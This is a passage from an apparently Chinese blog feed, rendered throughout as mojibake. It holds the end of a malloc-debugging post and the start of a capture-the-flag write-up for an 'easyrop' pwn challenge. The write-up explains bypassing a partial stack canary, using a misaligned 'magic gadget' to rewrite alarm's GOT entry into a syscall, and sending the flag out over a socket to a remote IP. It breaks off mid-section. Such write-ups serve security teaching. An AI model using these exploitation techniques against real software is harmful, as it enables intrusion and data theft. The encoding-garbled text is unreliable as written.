alt="image-20220813083643376"></p><p>è€Œnew_fçš„å€¼åº”è¯¥æ˜¯mallocè¿”å›çš„å †å—çš„ç”¨æˆ·åŒºåœ°å€ã€‚(å¦‚ä¸‹)</p><p><img src="https://s2.loli.net/2022/08/13/iMSIPThdeqc16U2.png" alt="image-20220813083753980"></p><p>è‡³æ­¤æˆ‘ä»¬å°±å®Œæˆäº†ä¸€æ¬¡æœ€ç®€å•çš„éªŒè¯ã€‚</p><p>è€Œä¹‹åçš„æµç¨‹ä¹Ÿå¤§è‡´å¦‚æ­¤ï¼Œå…ˆçœ‹æºç åˆ†æï¼Œå¦‚æœæºç çœ‹æ‡‚äº†é‚£å°±é…åˆåŠ¨æ€è°ƒè¯•çœ‹çœ‹æ˜¯å¦æ˜¯è‡ªå·±åˆ†æçš„é‚£æ ·ï¼Œå¦‚æœæºç æ²¡çœ‹æ‡‚ï¼Œå°±ç›´æ¥åŠ¨æ€è°ƒè¯•çœ‹çœ‹å‡½æ•°æ˜¯æ€ä¹ˆæ‰§è¡Œçš„ã€‚å¯¹äºåˆå­¦è€…è€Œè¨€åˆšå¼€å§‹å¯èƒ½ä¼šæ¯”è¾ƒå›°éš¾ï¼Œå¯ä»¥å»ç½‘ä¸Šæ‰¾ä¸€äº›å¸ˆå‚…å·²ç»åšè¿‡çš„æºç åˆ†ææ¥ä½œä¸ºå‚è€ƒï¼Œè¿™æ ·é‡åˆ°å®åœ¨åˆ†æä¸æ‡‚çš„åœ°æ–¹ï¼Œå°±çœ‹çœ‹å…¶ä»–å¸ˆå‚…æ˜¯æ€ä¹ˆåˆ†æçš„ã€‚</p><h2 id="5ã€å–„äºç”¨æœç´¢å¼•æ“"><a href="#5ã€å–„äºç”¨æœç´¢å¼•æ“" class="headerlink" title="5ã€å–„äºç”¨æœç´¢å¼•æ“"></a>5ã€å–„äºç”¨æœç´¢å¼•æ“</h2><p>ç°åœ¨è®¸å¤šå¸¸è§çš„é—®é¢˜å…¶å®å¾ˆå¤šéƒ½å¯ä»¥åœ¨å¸ˆå‚…ä»¬çš„æ–‡ç« ä¸­æ‰¾åˆ°ç­”æ¡ˆï¼Œå¦‚æœé‡åˆ°è‡ªå·±ä¸ä¼šçš„é—®é¢˜ï¼Œå¯ä»¥å°è¯•åœ¨ç™¾åº¦æˆ–è€…googleä¸Šæœç´¢(å¦‚æœæœ‰æ¡ä»¶çš„è¯ï¼Œæœ€å¥½è¿˜æ˜¯ç”¨google)ã€‚</p><h2 id="6ã€æ€»ç»“å‡½æ•°çš„è°ƒç”¨æµç¨‹"><a href="#6ã€æ€»ç»“å‡½æ•°çš„è°ƒç”¨æµç¨‹" class="headerlink" title="6ã€æ€»ç»“å‡½æ•°çš„è°ƒç”¨æµç¨‹"></a>6ã€æ€»ç»“å‡½æ•°çš„è°ƒç”¨æµç¨‹</h2><p>ä¸ºäº†ç¡®ä¿è‡ªå·±æ˜¯çœŸçš„ç†Ÿæ‚‰äº†å‡½æ•°æ•´ä¸ªçš„è°ƒç”¨æµç¨‹ï¼Œå»ºè®®è°ƒè¯•è¿‡ä¹‹åï¼Œè‡ªå·±åœ¨ä¸çœ‹æºç çš„æƒ…å†µä¸‹ï¼Œå°†å‡½æ•°çš„è°ƒç”¨æµç¨‹æ€»ç»“ä¸€éã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easyrop_2022èƒ–å“ˆå‹ƒæ˜¥å­£èµ›</title>
      <link href="/posts/d0e6a746.html"/>
      <url>/posts/d0e6a746.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ€»ç»“ï¼š</p><p>1ã€repæŒ‡ä»¤æ˜¯è¿›è¡Œå¾ªç¯ï¼Œmovs qword ptr [rdi],qword ptr[rsi]åˆ™å¯ä»¥æ‹·è´ï¼ŒäºŒè€…ç»“åˆå°±æ˜¯å¯ä»¥å¤§è§„æ¨¡æ‹·è´æ•°æ®åˆ°å¦ä¸€ä¸ªå†…å­˜ç©ºé—´ã€‚è€Œæƒ³å®ç°å®ƒï¼Œä»…ä»…åªéœ€è¦æ§åˆ¶rdiå’Œrsiä»¥åŠrcxå¯„å­˜å™¨å³å¯ã€‚</p><p>2ã€æˆ‘ä»¬å¾€å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ä¸­å†™å…¥çš„ä»»ä½•æœºå™¨ç éƒ½æ˜¯å¯ä»¥è¢«å½“åšæŒ‡ä»¤æ¥æ‰§è¡Œçš„ï¼Œè€Œæƒ³æ‰§è¡Œè¿™äº›æŒ‡ä»¤ï¼Œä»…ä»…ç”¨retæˆ–è€…callè·³è½¬åˆ°è¿™äº›æŒ‡ä»¤æ‰€åœ¨åœ°å€å³å¯<strong>ï¼ˆretå’Œcallè¦çš„æ˜¯æŒ‡ä»¤æ‰€åœ¨åœ°å€ï¼Œå¹¶éæŒ‡ä»¤ï¼‰</strong></p><p>3ã€å…³é—­æ ‡å‡†è¾“å‡ºï¼Œæ²¡æœ‰å›æ˜¾æ—¶ï¼Œå¯ä»¥åˆ©ç”¨magic_gadgetæ¥å»è·å–ä¸€äº›æˆ‘ä»¬éœ€è¦çš„å‡½æ•°ã€‚</p><p>4ã€å¼€å¯æ²™ç®±å¹¶ä¸”ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦å…¨å…³æ—¶ï¼ˆæ„å‘³ç€orwè¯»å–çš„flagä¹Ÿæ— æ³•çœ‹è§ï¼‰ï¼Œå¯ä»¥ç”¨socket+connectå°†flagå‘é€åˆ°è¿™ä¸ªæ–°å¼€çš„æ–‡ä»¶ä¸Šï¼ˆæ¯•ç«Ÿcloseå…³é—­çš„ä»…ä»…æ˜¯å½“å‰ç»ˆç«¯çš„0,1,2)</p><h1 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h1><p><img src="/../img/2706180-20220426101917635-1568812321.png"></p><p><img src="/../img/2706180-20220426101928743-1588465175.png"></p><h2 id="canaryå¼€äº†ï¼Œå°±æ²¡æ³•ç›´æ¥æº¢å‡ºï¼Ÿ"><a href="#canaryå¼€äº†ï¼Œå°±æ²¡æ³•ç›´æ¥æº¢å‡ºï¼Ÿ" class="headerlink" title="canaryå¼€äº†ï¼Œå°±æ²¡æ³•ç›´æ¥æº¢å‡ºï¼Ÿ"></a>canaryå¼€äº†ï¼Œå°±æ²¡æ³•ç›´æ¥æº¢å‡ºï¼Ÿ</h2><p>æ­¤æ—¶æ¥åˆ°çš„è¦è®²çš„ç¬¬ä¸€ç‚¹ï¼Œchecksecæ˜¯æ£€æµ‹å‡ºäº†canaryçš„ï¼Œä½†æ˜¯ç”¨gdbè°ƒè¯•ä¹‹åå‘ç°ï¼Œå¹¶æ²¡æœ‰çœ‹è§canaryï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œè€Œè¿”å›åœ°å€æ˜¯ç›´æ¥è¢«åƒåœ¾æ•°æ®è¦†ç›–äº†ã€‚</p><p><img src="/../img/2706180-20220426101943521-1024948707.png"></p><p>è¿™æ˜¯å› ä¸ºå‡ºé¢˜äººç¼–è¯‘ç¨‹åºçš„æ—¶å€™åªä½¿ç”¨äº† fstack-protector  é€‰é¡¹ï¼Œè€Œéä½¿ç”¨çš„ fstack-protector-all  ã€‚</p><p>ç®€å•æ¥è¯´ï¼Œ <strong>fstack-protector-all  é€‰é¡¹ä¼šå¯¹æ¯ä¸€ä¸ªå‡½æ•°éƒ½æ’å…¥ä¸€ä¸ªcanaryçš„å€¼ï¼Œä½†ç¼ºç‚¹æ˜¯ä¼šå¢åŠ å¾ˆå¤šé¢å¤–çš„æ ˆç©ºé—´</strong>ï¼Œå¢åŠ ç¨‹åºä½“ç§¯ã€‚<strong>è€Œå¼€å¯äº†fstack-protector  é€‰é¡¹åˆ™æ˜¯åœ¨å…·æœ‰å±€éƒ¨æ•°ç»„å˜é‡çš„å‡½æ•°ï¼ˆæ•°ç»„å¤§å°è¶…è¿‡å…«å­—èŠ‚ï¼‰æ‰ä¼šæ’å…¥canaryï¼Œç¼ºç‚¹æ˜¯ä¿æŠ¤èƒ½åŠ›æœ‰é™</strong>ã€‚</p><p>äº†è§£äº†ä¸Šè¿°å†…å®¹åï¼Œå¼€å¯fstack-protector  é€‰é¡¹å°±ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œå¦‚æœæ˜¯å®šä¹‰çš„intç±»å‹çš„å˜é‡ï¼Œè€Œåé¢åˆä½¿ç”¨äº†è¾“å…¥å‡½æ•°ä»è¿™ä¸ªå˜é‡å¼€å§‹å†™å…¥å­—èŠ‚ä¸”**<font color=red>è¾“å…¥å‡½æ•°å†™å…¥çš„å­—èŠ‚å¤§äºäº†å˜é‡ç±»å‹çš„å­—èŠ‚æ•°</font>ï¼Œå°±ä¼šå‡ºç°æ£€æŸ¥çš„æ—¶å€™æ˜æ˜æœ‰canaryä¿æŠ¤ï¼Œä½†æ˜¯ä¾æ—§å¯ä»¥æ­£å¸¸æº¢å‡ºçš„è¿™ç§æƒ…å†µ**ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚</p><p><img src="/../img/2706180-20220426101952307-600170163.png"></p><h1 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h1><p>ç¨‹åºæ•´ä½“æµç¨‹éå¸¸ç®€å•ï¼Œå­˜åœ¨0x1b0çš„æº¢å‡ºã€‚ç„¶åcloseå‡½æ•°å…³é—­äº†æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯ï¼Œ<strong>å°±æ˜¯ç¨‹åºæ²¡å›æ˜¾ä¸”æ— æ³•å¤šæ¬¡è¾“å…¥</strong>ã€‚å¦å¤–å¼€äº†æ²™ç®±ä¿æŠ¤ï¼Œæ— æ³•æ‰§è¡Œexecveæ¥è·å–shellã€‚é‚£orw?å¯æ˜¯æ ‡å‡†è¾“å‡ºä¹Ÿè¢«å…³äº†ï¼ˆä¹‹å‰ä¹Ÿåšè¿‡å…³é—­æ–‡ä»¶æè¿°ç¬¦çš„ï¼Œä¸è¿‡é‚£å‡ é“éƒ½æ²¡æœ‰æŠŠæ–‡ä»¶æè¿°ç¬¦å…¨éƒ¨å…³é—­ï¼Œå› æ­¤è·å–shellçš„æ—¶å€™é‡å®šå‘ä¸€ä¸‹æ–‡ä»¶æè¿°ç¬¦å°±okäº†ï¼Œä¸è¿‡è¿™é“é¢˜ä¸‰ä¸ªæè¿°ç¬¦å…¨å…³ï¼Œæ²¡åŠæ³•é‡å®šå‘æ–‡ä»¶æè¿°ç¬¦ï¼‰</p><p>å› æ­¤è¿™é“é¢˜é‡‡ç”¨çš„å¯¹æŠ—ç­–ç•¥æ˜¯ä¸€ç§ç‰¹æ®Šçš„orwï¼Œä½¿ç”¨socket+connect+orwã€‚å³åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—ç„¶åconnectä¸ä¸€ä¸ªipå’Œç«¯å£æ‰€ç»‘å®šï¼Œå†orwï¼Œè¯»å–flagï¼Œå°†flagæ‰“å°åˆ°æ–°å¼€çš„socketä¸Šï¼Œä¸‹é¢ä»”ç»†è®²ä¸€ä¸‹è¿™äº›éƒ½æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ã€‚</p><h1 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h1><h3 id="socketå‡½æ•°å’Œconnectå‡½æ•°å’‹ç†è§£ï¼Ÿ"><a href="#socketå‡½æ•°å’Œconnectå‡½æ•°å’‹ç†è§£ï¼Ÿ" class="headerlink" title="socketå‡½æ•°å’Œconnectå‡½æ•°å’‹ç†è§£ï¼Ÿ"></a>socketå‡½æ•°å’Œconnectå‡½æ•°å’‹ç†è§£ï¼Ÿ</h3><p>å…·ä½“è§£é‡Šçš„è¯å¯ä»¥çœ‹ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼Œæˆ‘è°ˆä¸€ä¸‹è‡ªå·±çš„ç†è§£ã€‚(è¿™ä¸¤ä¸ªå‡½æ•°å¸ƒç½®å‚æ•°æ—¶ï¼Œéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œæˆ‘åšäº†ç›¸å…³è§£é‡Šï¼Œéƒ½æ”¾åœ¨äº†æ–‡æœ«)</p><p><strong>socketå‡½æ•°å°±æ˜¯å»åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—</strong>ï¼ˆè¿™ä¸ªå¥—æ¥å­—å¾ˆæŠ½è±¡ï¼Œä¸è¿‡linuxä¸­ä¸‡ç‰©çš†æ–‡ä»¶ï¼Œæˆ‘å°±å…ˆè¯•ç€æŠŠå®ƒç†è§£ä¸ºä¸€ä¸ªæ–‡ä»¶ï¼‰ï¼Œå¦‚æœå•ç‹¬ä½¿ç”¨çš„è¯ï¼Œå®ƒä»…ä»…ä¼šåˆ›å»ºå’Œå£°æ˜ä¸€ä¸‹è¿™ä¸ªâ€™æ–‡ä»¶â€™çš„ç‰¹å¾ï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆæŒ‡å‘äº†åˆ›å»ºçš„è¿™ä¸ªæ–‡ä»¶ï¼‰ã€‚ä½†æ­¤æ—¶å®ƒè¿˜æ˜¯ä¸ªç©ºå£³å­ï¼Œå¹¶æ²¡æœ‰çµé­‚ã€‚</p><p><strong>è€Œconnectå‡½æ•°çš„ä½œç”¨å°±æ˜¯èµ‹äºˆåˆšåˆšé‚£ä¸ªç©ºå£³å­çµé­‚</strong>ï¼Œä¹Ÿå°±æ˜¯<strong>å°†ç½‘ç»œçš„åœ°å€ä¸è¿™ä¸ªæ–‡ä»¶è”ç³»èµ·æ¥</strong>ã€‚ä½¿ç”¨connectå‡½æ•°ä¹‹åï¼Œç½‘ç»œçš„ä¸€ä¸ªåœ°å€åŠç«¯å£å°±ç®—ä¸socketç»‘å®šäº†,æ­¤æ—¶å‘é€åˆ°socketä¸Šçš„æ•°æ®å°±å‘åˆ°äº†ä¸å…¶ç»‘å®šçš„ipçš„ç«¯å£ä¸Šã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ç°åœ¨çš„å¤§è‡´æ€è·¯å‡ºæ¥äº†ï¼Œä½†æ˜¯æœ‰å¾ˆå¤šåœ°æ–¹çš„ç»†èŠ‚é—®é¢˜è¿˜è¦è§£å†³ï¼Œå› ä¸ºç¨‹åºé‡Œæ²¡æœ‰socketå‡½æ•°å’Œconnectå‡½æ•°ï¼Œä½†ç°åœ¨è¿˜éœ€è¦ä½¿ç”¨ï¼Œé‚£æˆ‘ä»¬åªèƒ½å»ç³»ç»Ÿè°ƒç”¨ã€‚</p><p><img src="/../img/2706180-20220426102004222-1183097211.png"></p><p>æ²¡æœ‰syscallâ€¦   ä¸è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨magic gadgeté€ ä¸€ä¸ªå‡ºæ¥</p><h1 id="magic-gadget"><a href="#magic-gadget" class="headerlink" title="magic gadget"></a>magic gadget</h1><h2 id="ä»€ä¹ˆæ˜¯magic-gadgetï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯magic-gadgetï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯magic gadgetï¼Ÿ"></a>ä»€ä¹ˆæ˜¯magic gadgetï¼Ÿ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br><span class="line">nop    DWORD PTR [eax+eax*1+0x0]</span><br><span class="line">repz ret</span><br></pre></td></tr></table></figure><p>magic gadgetä¼¼ä¹æ˜¯ä¸€ç§ç»Ÿç§°ï¼Ÿå°±æ˜¯ä¸Šé¢è¿™ç§ç¥å¥‡çš„å°ç©æ„ï¼Œå¸ˆå‚…ä»¬éƒ½å«å®ƒmagic gadgetï¼Œä¼¼ä¹å¹¶ä¸å•æŒ‡æŸä¸ªgadgetsï¼Œå› ä¸ºå‰ä¸€æ®µåš<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>çš„æ—¶å€™ï¼Œç¢°è§äº†å¦ä¸€ä¸ªmagic_gadgetsã€‚</p><h2 id="magic-gadgetå®ƒæœ‰ä»€ä¹ˆç”¨ï¼Ÿ"><a href="#magic-gadgetå®ƒæœ‰ä»€ä¹ˆç”¨ï¼Ÿ" class="headerlink" title="magic gadgetå®ƒæœ‰ä»€ä¹ˆç”¨ï¼Ÿ"></a>magic gadgetå®ƒæœ‰ä»€ä¹ˆç”¨ï¼Ÿ</h2><p>è¿™ä¸ªgadgetçš„æ ¸å¿ƒå°±åœ¨äº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥å®ƒå¯ä»¥å»ä¿®æ”¹ebp-0x3dæ‰€æŒ‡å‘çš„å†…å®¹ï¼Œ<strong>åªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶rbpå’Œebxï¼Œé‚£å°±å¯ä»¥å»ä¿®æ”¹ä»»æ„åœ°å€çš„ä»»æ„å€¼äº†</strong>ï¼ˆæˆ‘ä»¬å¯ä»¥å€Ÿæ­¤æ¥å®ç°ä¿®æ”¹gotè¡¨ï¼Œæˆ–è€…æ˜¯å¾€bssæ®µå†™ä»»æ„æ•°æ®ï¼‰</p><h2 id="magic-gadgetåº”è¯¥æ€ä¹ˆå»åˆ©ç”¨ï¼Ÿ"><a href="#magic-gadgetåº”è¯¥æ€ä¹ˆå»åˆ©ç”¨ï¼Ÿ" class="headerlink" title="magic gadgetåº”è¯¥æ€ä¹ˆå»åˆ©ç”¨ï¼Ÿ"></a>magic gadgetåº”è¯¥æ€ä¹ˆå»åˆ©ç”¨ï¼Ÿ</h2><p>é¦–å…ˆæˆ‘ä»¬è¦æƒ³åŠæ³•æ§åˆ¶rbpå’Œebxçš„å€¼ï¼Œè¿™ä¸€ç‚¹æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºä¸­çš„csuç‰‡æ®µæ¥åšåˆ°ã€‚</p><h3 id="å…ˆè¯´ä¿®æ”¹gotè¡¨"><a href="#å…ˆè¯´ä¿®æ”¹gotè¡¨" class="headerlink" title="å…ˆè¯´ä¿®æ”¹gotè¡¨"></a>å…ˆè¯´ä¿®æ”¹gotè¡¨</h3><p>æ—¢ç„¶addå¢åŠ çš„æ˜¯rbp-0x3dæ‰€æŒ‡å‘çš„æ•°æ®ï¼Œè€Œebxåˆæ˜¯å¢åŠ çš„å€¼ï¼Œæˆ‘å°±ä»¥è¿™é“é¢˜è·å–syscallçš„æ–¹æ³•ä¸ºä¾‹è¯´æ˜ä¸€ä¸‹ã€‚</p><p>ç”±äºåœ¨alarmå‡½æ•°é‡Œsyscallè·ç¦»alarmå‡½æ•°çš„çœŸå®åœ°å€åç§»ä»…ä»…ä¸º5ï¼Œé‚£å²‚ä¸æ˜¯è¯´æˆ‘<strong>ebxå­˜ä¸€ä¸ª5ï¼Œç„¶åè®©rbp-0x3dä¸ºalarmçš„gotåœ°å€ï¼Œæ‰§è¡Œmagic gadgetå°±å¯ä»¥ä¿®æ”¹alarmçš„gotè¡¨ä¸ºsyscallçš„çœŸå®åœ°å€</strong>ã€‚å¦‚æ­¤æˆ‘ä»¬å†æ‰§è¡Œalarmå‡½æ•°çš„æ—¶å€™ï¼Œå°±ç›¸å½“äºæ‰§è¡Œçš„æ˜¯syscallã€‚</p><blockquote><p>æ­¤æ—¶è¿™é‡Œå°±æœ‰ä¸€ä¸ªå‘ï¼Œæƒ³æ‰§è¡Œsyscallçš„æ—¶å€™ï¼Œæˆ‘åº”è¯¥ç”¨alarmçš„gotåœ°å€è¿˜æ˜¯pltåœ°å€ï¼Ÿ ç­”æ¡ˆæ”¾åœ¨äº†æ–‡æœ«</p></blockquote><h3 id="å†è¯´å¾€bssæ®µä¸­ä»»æ„å†™å…¥æ•°æ®"><a href="#å†è¯´å¾€bssæ®µä¸­ä»»æ„å†™å…¥æ•°æ®" class="headerlink" title="å†è¯´å¾€bssæ®µä¸­ä»»æ„å†™å…¥æ•°æ®"></a>å†è¯´å¾€bssæ®µä¸­ä»»æ„å†™å…¥æ•°æ®</h3><p>å…¶å®è¯´å†™å…¥æ•°æ®å°±åº”è¯¥æƒ³åˆ°ä¸€ä¸ªç–‘é—®ï¼ŒaddæŒ‡ä»¤æ˜¯è¿›è¡ŒåŠ æ³•ï¼Œå’‹å°±èƒ½ç›´æ¥å»å†™å…¥<strong>ä»»æ„</strong>æ•°æ®äº†ï¼Œå¦‚æœrbp-0x3dæŒ‡å‘çš„ä½ç½®åŸæœ¬å°±æœ‰æ•°æ®ï¼Œè¿˜èƒ½ä»»æ„å†™ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯ä¸èƒ½çš„ï¼Œè¿™åªæ˜¯ä¸€ä¸ªmagic gadgetï¼Œåˆä¸æ˜¯ä¸€ä¸ªæ— æ•Œgadgetï¼ŒæŒ‡ä»¤ç¡®å®åªèƒ½ç›¸åŠ ï¼Œå¯æ³¨æ„å®¡é¢˜ï¼Œæˆ‘è¯´çš„æ˜¯<strong>å¾€bssæ®µä»»æ„å†™å…¥æ•°æ®</strong>ã€‚bssæ®µæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ<strong>å®ƒå±äºé™æ€å†…å­˜åˆ†é…ï¼Œç¨‹åºä¸€å¼€å§‹å°±ä¼šå¯¹è¿™ä¸ªæ®µè¿›è¡Œæ¸…é›¶</strong>ã€‚æ—¢ç„¶<strong>bssæ®µé‡Œé¢éƒ½æ˜¯0ï¼Œé‚£å°±ç›¸å½“äºæˆ‘ä¸ç®¡addä»€ä¹ˆï¼Œéƒ½æ˜¯ç›¸å½“äºæˆ‘å¾€é‡Œé¢å†™äº†ä»€ä¹ˆ</strong>ã€‚å› æ­¤ç”¨magic gadgetåœ¨å¯¹bssæ®µè¿›è¡Œæ“ä½œçš„æ—¶å€™ï¼Œæ˜¯å¯ä»¥è¾¾åˆ°ä»»æ„åœ°å€ä»»æ„å†™çš„ï¼ˆä¸è¿‡å€¼å¾—ä¸€æçš„æ˜¯ï¼Œ<strong>ç”±äºåç§»æ˜¯æ”¾åœ¨ebpä¸­çš„ï¼Œå› æ­¤åœ¨64ä½ç¨‹åºé‡Œé¢ï¼Œç”¨magic gadgetå†™çš„æ—¶å€™ï¼Œä¸€æ¬¡åªèƒ½å†™å…¥å››ä¸ªå­—èŠ‚</strong>ï¼‰</p><h2 id="å¯»æ‰¾magic-gadget"><a href="#å¯»æ‰¾magic-gadget" class="headerlink" title="å¯»æ‰¾magic gadget"></a>å¯»æ‰¾magic gadget</h2><p>è¿™ä¸ªç¥å¥‡çš„å°ä¸œè¥¿å­˜åœ¨äº__do_global_dtors_auè¿™ä¸ªå‡½æ•°ä¸­ï¼Œå®ƒæ˜¯gccç¼–è¯‘å™¨è‡ªèº«çš„ä¸€ä¸ªå‡½æ•°ï¼Œä½œç”¨æ˜¯ææ„å‡½æ•°ã€‚ä½†æ˜¯<strong>åœ¨idaæŸ¥çœ‹ä¼šå‘ç°è¿™æ®µgadgetå¹¶ä¸å­˜åœ¨ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å°†æœºå™¨ç é”™ä½å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„gadget</strong>ã€‚</p><p><img src="/../img/2706180-20220426102017372-286472307.png"></p><p>ç°åœ¨çœ‹ä¸€ä¸‹idaæ­£å¸¸çš„ä¸¤ä¸ªæŒ‡ä»¤ï¼Œä»¥åŠä»–ä»¬å¯¹åº”çš„åå…­è¿›åˆ¶æœºå™¨ç <img src="/../img/2706180-20220426102025440-653483116.png"><br><img src="/../img/2706180-20220426102033744-1476514134.png"></p><p><img src="/../img/2706180-20220426102057610-1265266427.png"></p><p><img src="/../img/2706180-20220426102206921-1073508038.png"></p><p>å‘ç°å°†æœºå™¨ç å†è½¬æˆæ±‡ç¼–ï¼Œç¡®å®æ˜¯åŸæ¥çš„æŒ‡ä»¤ã€‚ä¸è¿‡æˆ‘ä»¬ç°åœ¨å»æ‹¿01 5d c3è¿™æ®µæœºå™¨ç ï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢ä¸¤ä¸ªæŒ‡ä»¤ä¹‹é—´çš„ä¸€éƒ¨åˆ†ï¼‰å»å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„magic gadgetï¼ˆå¦‚ä¸‹å›¾ï¼‰<br><img src="/../img/2706180-20220426102217546-987677091.png"></p><p><strong>ç†è®ºä¸Šè¿™ä¸ªgadgetåœ¨æ¯ä¸ª64ä½ç¨‹åºéƒ½å­˜åœ¨ï¼ˆä¸è¿‡éœ€è¦æœºå™¨ç é”™ä½å¾—åˆ°ï¼‰</strong>ã€‚</p><p>éœ€è¦çš„æ—¶å€™ï¼Œç›´æ¥ç”¨Ropgadgetæœè¿™ä¸ªæœºå™¨ç å°±å¯ä»¥äº†ã€‚ï¼ˆå‚æ•°æ˜¯opcode)<br><img src="/../img/2706180-20220426102225206-1415630040.png"></p><h3 id="æ€ä¹ˆç†è§£è¿™ä¸ªé”™ä½å¾—åˆ°çš„æœºå™¨ç ï¼Ÿ"><a href="#æ€ä¹ˆç†è§£è¿™ä¸ªé”™ä½å¾—åˆ°çš„æœºå™¨ç ï¼Ÿ" class="headerlink" title="æ€ä¹ˆç†è§£è¿™ä¸ªé”™ä½å¾—åˆ°çš„æœºå™¨ç ï¼Ÿ"></a>æ€ä¹ˆç†è§£è¿™ä¸ªé”™ä½å¾—åˆ°çš„æœºå™¨ç ï¼Ÿ</h3><p><img src="/../img/2706180-20220426102239185-1717796383.png"></p><p>è§‚å¯Ÿä¸Šå›¾ï¼Œå¾ˆå®¹æ˜“å°±ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼ŒCPUå¦‚ä½•çŸ¥é“è¿™ä¸ªæœºå™¨æŒ‡ä»¤çš„é•¿åº¦ï¼Ÿ</p><p>å…¶å®å•Šï¼Œæ¯ä¸ªæŒ‡ä»¤ç”±æ“ä½œç å’Œæ“ä½œæ•°ä¸¤éƒ¨åˆ†ç»„æˆï¼ŒCPUè®¾è®¡å¥½çš„æ—¶å€™ï¼ŒæŒ‡ä»¤é›†å°±å·²ç»ç¡®å®šäº†ï¼ŒCPUå¯¹æ¯æ¡æŒ‡ä»¤éƒ½è§„å®šäº†å¯¹åº”çš„æœºå™¨ç ï¼Œ<strong>CPUåˆšå¼€å§‹è¯»å–æŒ‡ä»¤çš„æ—¶å€™ï¼Œå¹¶ä¸çŸ¥é“è¿™ä¸ªæŒ‡ä»¤çš„é•¿åº¦ï¼Œä¸è¿‡å®ƒä¼šå…ˆè¯»å–æ“ä½œç ï¼Œè¯»å®Œæ“ä½œç ä¹‹åï¼Œå®ƒå°±çŸ¥é“è¿™ä¸ªæŒ‡ä»¤åº”è¯¥æ˜¯å¤šé•¿äº†ï¼Œä»è€Œå†å»è¯»å¯¹åº”å­—èŠ‚çš„æ“ä½œæ•°</strong>ã€‚</p><p>è¿™æ ·å†ç†è§£é”™ä½æœºå™¨ç çš„æ—¶å€™å°±å¾ˆå®¹æ˜“äº†ï¼ŒCPUé¢å¯¹çš„åªæœ‰äºŒè¿›åˆ¶01ï¼ˆä¸Šé¢å†™æˆåå…­è¿›åˆ¶æ˜¯æ–¹ä¾¿ç†è§£ï¼‰ï¼Œåªè¦ä½ èƒ½ç¡®ä¿ä½ æƒ³è¦çš„æŒ‡ä»¤æ˜¯å­˜åœ¨äºä»£ç æ®µçš„ï¼Œå°½ç®¡ä»–ä»¬åœ¨idaé‡Œæ˜¯çœ‹ä¸åˆ°çš„ã€‚å´ä¾ç„¶å¯ä»¥å»æ‹¿è¿™ä¸ªæŒ‡ä»¤å»æ‰§è¡Œï¼Œ<strong>å› ä¸ºCPUå¹¶ä¸ä¼šå»æ£€æŸ¥ä½ è¿™ä¸ªæŒ‡ä»¤æ˜¯å¦æ˜¯ç¨‹åºä¸­æ­£å¸¸çš„æŒ‡ä»¤ï¼Œå³ä½¿ä½ æ˜¯é”™ä½å¾—åˆ°çš„</strong>ã€‚</p><h2 id="ä¸€ä¸ªå­—èŠ‚å¤ªå¤šçš„payload"><a href="#ä¸€ä¸ªå­—èŠ‚å¤ªå¤šçš„payload" class="headerlink" title="ä¸€ä¸ªå­—èŠ‚å¤ªå¤šçš„payload"></a>ä¸€ä¸ªå­—èŠ‚å¤ªå¤šçš„payload</h2><p>ç°åœ¨ä¹Ÿæœ‰äº†syscallï¼Œé‚£æŒ‰ç†è¯´å¯ä»¥å»è¿›è¡Œç³»ç»Ÿè°ƒç”¨socketå’Œconnectäº†å§ï¼Ÿ<br><img 